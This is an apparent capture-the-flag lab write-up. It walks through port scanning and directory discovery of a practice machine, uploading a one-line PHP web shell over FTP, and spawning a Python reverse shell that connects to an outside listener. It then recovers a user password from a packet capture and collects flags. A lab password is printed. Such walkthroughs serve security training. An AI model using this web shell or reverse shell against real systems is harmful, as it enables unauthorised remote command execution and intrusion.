# Lazyadmin

```jsx
                                                                               
┌──(ayachi㉿kali)-[~]
└─$ nmap -sV -Pn 10.112.185.39                                       
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-25 22:27 CET
Nmap scan report for 10.112.185.39
Host is up (0.082s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.32 seconds
                                                       
```

gobuster result 

```jsx
/files    (Status: 301) [Size: 314] [--> http://10.112.185.39/files/]
```

we have a potential user , in files/notice.txt “maya” is mentioned 

```jsx
ftp 10.112.185.39
```

we can upload to directory /ftp

```jsx
└─$ cat shell.php      
<?php system($_GET['cmd']); ?>
                      
```

go to the url  ip/files/ftp/shell.php?cmd=id

that work , the RCE  is working

now lets do a reverse shell

bash did not work , python did

```jsx
nc -lvnp ip
```

```jsx
http://10.112.185.39/files/ftp/shell.php?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("192.168.143.165",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

now

under / ther is the first flag : recipe.txt 

anbd there is a folder wioth the owner www-data incident

under it there is  suspicious.pcapng

```jsx
cp /incidents/suspicious.pcapng /var/www/html/

open it in wireshark we find a password for lennie
```

c4ntg3t3n0ughsp1c3

we find the seconf flag user.txt THM{redacted}